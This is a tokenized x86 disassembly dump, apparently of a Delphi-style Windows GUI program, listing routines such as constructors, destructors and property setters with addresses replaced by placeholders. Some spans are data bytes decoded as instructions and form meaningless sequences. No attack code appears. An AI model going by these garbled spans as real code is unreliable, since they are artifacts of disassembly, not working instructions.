add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x18004493 ] bl
add [ eax ] al
add [ ebx + ebp ] dh
inc ecx
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_4493a4
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41b3c8
test bl bl
jle r-xdata
mov edx esi
call sub_4497b8
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_449414
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41aedc
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_4494bc
sub_449448
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4493d8
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413ff8
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_414184
sub_449490
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_404304
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_403f4c
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_4494bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_4497b8
mov edx ebx
mov eax esi
call sub_449798
sub_4494e4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4494bc
sub_449510
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_45e698
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_403320
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41b454
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_43a36c
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_449568
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_45e6c0
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_403320
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41b470
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_43a36c
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4495c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41aa7c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_449744
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_44962c
push ebx
push esi
push edi
call sub_4034b0
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_403124
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_4141f0
call sub_403124
mov eax [ edi + 0x30 ]
call sub_403124
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41aac8
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403498
sub_44967c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_4496c4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_414164
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032d4
mov edx edi
call sub_449448
sub_449710
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_44b46c
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_44b4b0
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_41ab4c
sub_449750
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41ad98
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_4497b8
sub_449798
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413fac
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_41ab4c
pop esi
pop ebx
retn
sub_4497b8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4142a4
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_4497d4
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_44983c
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_454520
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_44cd08
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44a0e4
mov edx ebp
call sub_44a144
inc eax
je r-xdata
sub_4498c8
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4498e8
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_449908
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_449d58
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_449d58
sub_449aa0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41b384
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_449af4
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_403124
mov eax [ esi + 0x9c ]
call sub_403124
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4493a4
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40d1c0
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_449b44
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414800
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_449bf0
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_449c50
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_449d58
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_449e90
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_449ef0
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_449f4c
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_449fb0
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_449bf0
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_404304
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_403f4c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032d4
test eax eax
je r-xdata
sub_449c50
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_449d48
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_449708
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4032d4
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_4496f4
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_449c50
sub_449d58
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032d4
test eax eax
je r-xdata
sub_449dd0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_404304
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_403f4c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_414108
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_414108
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
sub_449e38
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032d4
test eax eax
je r-xdata
sub_449e90
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_404304
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_403f4c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032d4
test eax eax
je r-xdata
sub_449ef0
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032d4
test eax eax
je r-xdata
sub_449f4c
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032d4
test eax eax
je r-xdata
sub_449fb0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_414108
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4032d4
test eax eax
je r-xdata
sub_44a010
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_404304
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_41afd4
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_449bf0
sub_44a05c
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_44a084
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_449510
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_449c50
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_44a118
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_416068
mov edi eax
mov eax esi
call sub_44cff4
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_44a144
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_44a188
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44a1ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a1b4
retn
sub_44a233
push [ eax ]
mov ebp 0x540b0044
inc ebx
push 0x65676e61
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add ecx [ 0x61724454 ]
ja r-xdata
insd
popad
push es
outsb
push ebx
je r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
xor al 0xa3
inc esp
popad
dec ecx
outsb
js r-xdata
inc esp
add [ ecx ] al
or edx [ ecx + ecx * 2 + 0x6d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edx + 0x44 ] al
add [ edi ] al
jae r-xdata
mov eax 0x20000000
retn
je r-xdata
imul esi [ ebp + ecx * 2 + 0x61 ] 0x49076b73
insd
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
add [ eax ] al
add [ eax + 0x70044a2 ] bl
imul esi [ ecx + ecx * 2 + 0x6d ] 0x6656761
outsd
arpl [ ebp + 0x73 ] si
or ah [ ebx + esi * 2 + 0x53 ]
insb
arpl [ gs : ebp + 0x64 ] si
or [ ebx + esi * 2 + 0x4e ] ah
outsd
jb r-xdata
pop ds
retn
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0x9800408d
mov [ 0x10070044 ] eax
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
or eax 0x72547364
popad
outsb
jae r-xdata
je r-xdata
mov [ 0x44 ] eax
add [ eax ] al
add [ eax ] al
popad
jb r-xdata
fimul [ ebx - 0x742dcc10 ]
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
shr [ edx ] 0x1
inc ecx
add [ edx ] al
add [ edi ] al
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc08b0000
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
cwde
mov [ 0x69070044 ] al
je r-xdata
inc esp
add [ eax + 0x680044a3 ] al
add [ eax ] al
add ah dl
sub [ ecx ] eax
in al dx
mov cl 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x44a3 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5d ] bh
outsb
je r-xdata
add [ eax ] al
js r-xdata
mov eax eax
pushfd
mov [ 0xa030044 ] al
push esp
dec ecx
insd
popad
push esp
jns r-xdata
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xa29cc08b
inc esp
add [ ebx ] al
or dl [ ecx + ecx * 2 + 0x6d ]
add [ eax + 0x33 ] bh
inc eax
add [ eax - 0x55 ] al
inc ecx
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
mov al [ 0xffffffffcc0044a4 ]
mov dl 0x44
add [ esi + esi * 4 + 0x44 ] dl
add [ edx + esi * 4 ] cl
inc esp
add ah cl
scasb [ edi ]
inc ecx
add [ eax - 0x23ffbe53 ] bl
scasb [ edi ]
inc ecx
add ah dl
scasd [ edi ]
inc ecx
add [ edx + esi * 4 ] al
inc ecx
add ah ch
scasb [ edi ]
inc ecx
add ah ah
scasb [ edi ]
inc ecx
add [ edx + esi * 4 ] cl
inc ecx
add [ eax ] al
movsb [ edi ] [ esi ]
inc esp
add [ eax ] al
scasb [ edi ]
inc esp
add [ 0xffffffffbb080044 ] cl
inc esp
add [ ebx + edi * 4 - 0x4bf3ffbc ] dl
inc esp
add [ ecx ] al
add bh ch
[ esp + esi * 4 ]
inc esp
add [ eax ] dl
push esp
inc ebx
jne r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
sub_44a400
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41aa7c
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_44a44c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_41aa7c
mov [ edi + 0x34 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x30 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_44a4a0
push ebx
push esi
push edi
call sub_4034b0
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_4141f0
mov edx eax
mov eax edi
call sub_44b46c
mov eax [ edi + 0x50 ]
call sub_403124
mov eax edi
call sub_44a7fc
mov eax [ edi + 0x4c ]
call sub_403124
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41aac8
test bl bl
jle r-xdata
call sub_403124
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403498
sub_44a50c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
